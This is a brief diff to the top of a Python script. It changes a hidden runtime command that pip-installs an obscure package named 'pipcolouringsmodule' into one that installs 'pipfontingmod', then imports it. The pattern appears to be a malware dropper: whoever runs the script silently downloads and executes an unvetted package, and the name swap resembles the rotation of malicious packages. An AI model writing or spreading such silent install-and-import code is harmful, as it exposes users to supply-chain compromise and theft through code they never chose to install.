@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouringsmodule")
-import pipcolouringsmodule
+os.system("pip install pipfontingmod")
+import pipfontingmod
 import random
 import requests
 import time
